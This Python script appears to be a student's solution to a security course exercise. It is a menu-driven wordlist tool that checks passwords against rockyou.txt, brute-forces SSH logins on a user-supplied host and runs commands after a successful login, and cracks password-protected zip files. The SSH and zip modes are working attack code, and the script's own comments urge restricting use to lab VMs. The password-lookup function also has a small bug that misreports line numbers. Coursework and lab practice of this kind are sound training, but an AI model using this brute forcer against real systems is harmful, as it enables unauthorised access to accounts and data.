#!/usr/bin/python3

# Script: Ops 401 Class 16 Ops Challenge Solution
# Author: Ariel D.                  
# Date of latest revision: 24OCT2022      
# Purpose: 
    # Mode 1: Offensive; Dictionary Iterator
        # Accepts a user input word list file path and iterates through the word list, assigning the word being read to a variable.
        # Add a delay between words.
        # Print to the screen the value of the variable.
    # Mode 2: Defensive; Password Recognized
        # Accepts a user input string.
        # Accepts a user input word list file path.
        # Search the word list for the user input string.
        # Print to the screen whether the string appeared in the word list.
    # Mode 3: Authenticate to an SSH server by its IP address.
        # Assume the username and IP are known inputs and attempt each word on the provided word list until successful login takes place.
    # Mode 4: 
        # Pass user password input through the RockYou.txt list to test all words in the list against the password-locked zip file.
# Resources:
    # https://www.geeksforgeeks.org/iterate-over-a-set-in-python/
    # https://www.kaggle.com/wjburns/common-password-list-rockyoutxt (For the word list to search)
    # https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/
    # https://docs.python.org/3/library/zipfile.html#module-zipfile
    # https://www.howtoforge.com/how-to-protect-zip-file-with-password-on-ubuntu-1804/
# Key Note: 
    # File path to rockyou.txt
    # Stay out of trouble! Restrict this kind of traffic to your local network VMs.

# Import necessary libraries for called functions
import time, sys
from pexpect import pxssh
from zipfile import ZipFile

# Declare functions
# Define iterator function that asks user for file path to document to read and print to the screen line by line with pause inbetween 
def iterator():
    # Variable fpath for file path that the user wants to read and print to the screen line by line
    fpath = input("Enter your dictionary filepath:\n")
    # Defines variable that opens file in fpath given by user
    file = open(fpath)
    # Defines variable line that reads the document line by line
    line = file.readline()

    # While loop that formats the line, prints it out, waits a second, then continues until there is no word in the line
    while line:
        line = line.rstrip()
        word = line
        print(word)
        time.sleep(1)
        line = file.readline()
    # Closes the file when while loop completes
    file.close()

# Defines password_check function that asks user for a common password and checks if it is held within the file in the file path by opening, reading, and outputs the results of the search
def password_check():
    # Variable passw asks user for common password input
    passw = input("Input what you think is one of the most common passwords:\n")
    # Variable fpath for file path of the rockyou.txt file to search the passw against
    fpath = input("Enter your dictionary filepath to the rockyou.txt file:\n")
    # Variable to open the document found at fpath and read it
    txtfile = open(fpath, "r")
    # Defines variables status at 0 by default (word not found in file)
    status = 0
    #Defines variable line at 0 to add one to each additional line searched
    location = 0

    # For loop that searches line by line to find the passw the user input, if not found, it will increase the index by 1....
    for line in txtfile:
        status += 1

        # If found, it will set the flag to 1 and continue to the if statement with the results
        if passw in line:
            status = 1
            break

    # If nothing was found, status remains 0 and the passw was not found, so print
    if status == 0:
        print('Password', passw, 'was not found in the list of common passwords file. Try again next time!')
    
    # If passw was found, status changes to 1 and the passw location is printed to the screen
    else:
        print('Password', passw, 'was found on line', location, 'in the common passwords file. Congrats! You know a common pasword to avoid!')

# Define ssh_connect function that will prompt the user for the target's IP and username along with the dictionary file path, check each line of the file and will print out the username, password, uptime, number of users, and success/failure, then restart at the main menu.
def ssh_connect():
    # Prompts user for host variable of target IP address
    host = input("Enter target host IP:  ")
    # Prompts user for username variable of target user of target IP address
    username = input("Enter target host username:  ")
    # Prompts user for the local brute force dictionary filepath to find the password for the user
    filepath = input("Enter your brute force dictionary filepath:  ")
    # Variable file that opens the file and just makes it more visually friendly
    file = open(filepath, encoding = "ISO-8859-1")
    # Variable line that reads the brute force dictionary file line by line
    line = file.readline()
    # Sets the default answer to no
    success = "no"
    
    # if loop until there are no lines left or if the function finds the password for the user (.decode is used for friendly formatting of output)
    if success == "no":
        # While success is no, it will show the password it is attempting to use to login
        while line:
            # Removes extra spaces and makes it more formatted
            line = line.rstrip()
            passw = line
            print(f"Checking '{passw}'...")
            session = pxssh.pxssh()

            try:
                session.login(host, username, passw)
                print("\nSuccessful login!")
                session.sendline('whoami')
                session.prompt()
                print(f"Username: {str(session.before)[12:-5]}  Password: {passw}")
                session.sendline('uptime')
                session.prompt()
                print((session.before).decode())
                session.sendline('ls -l')
                session.prompt()
                print((session.before).decode())
                session.logout()
                success = "yes"
                print("[*] Congrats! You have brute forced the password! The user logon information can be found above, returning to menu.")
                break

            # If it fails to connect this will show on the screen
            except pxssh.ExceptionPxssh as e:
                print("Login attempt failed.")
            
            # If user hits Ctrl+C, this will print to the screen and exit the function
            except KeyboardInterrupt:
                print("\n\n[*] User requested an interrupt")
                sys.exit()

            # Waits half a second to read the next line
            time.sleep(.5)
            # Reads next line
            line = file.readline()
       
        # Closes the file
        file.close()
    
    # Exits the function if no more line are there to check
    else:
        exit

# Define crack_file function that prompts the user for the encrypted file path and the dictionary file path to run it through to brute force the password
def crack_file():
    # Prompts user for the file they wish to decrypt
    crack_file = input("Enter the filepath of the file you wish to crack the password on:  ")
    # Prompts user for the local brute force dictionary filepath to find the password for the user
    dictionary = input("Enter your dictionary filepath:  ")
    # Variable file that opens the file and just makes it more visually friendly
    file = open(dictionary, encoding = "ISO-8859-1")
    line = file.readline()
    success = "no"

    # if loop until there are no lines left or if the function finds the password for the user (.decode is used for friendly formatting of output)
    if success == "no":
        while line:
            # Removes extra spaces and makes it more formatted
            line = line.rstrip()
            passw = line
            print(f"Checking '{passw}'...")

            try:
                with ZipFile(crack_file) as zf:
                    zf.extractall(pwd=bytes(passw,'utf-8'))
                success = "yes"
                print(f"File decrypted with '{passw}' - returning to main menu.")
                break

            except:
                pass
           
            # Waits half a second to read the next line
            time.sleep(.5)
            # Reads next line
            line = file.readline()

        # Closes the file
        file.close()
    
    # Exits the function if no more line are there to check
    else:
        exit

# Main

# If statments that run this when bruteforce.py is ran on the computer, and only exit when 3 is input
if __name__ == "__main__":
    while True:
        mode = input("""
Brute Force Wordlist Attack Tool Menu
1 - Offensive: Dictionary Iterator
2 - Defensive: Password Recognized
3 - Authenticate to an SSH Server
4 - Crack a Password Protected ZipFile
5 - Exit
    Please enter a number: 
""")
        if (mode == "1"):
            iterator()
        elif (mode == "2"):
            password_check()
        elif (mode == '3'):
            ssh_connect()
        elif (mode == '4'):
            crack_file()
        elif (mode == '5'):
            break
        else:
            print("Invalid selection...Please input a number from the listed tasks.")


# End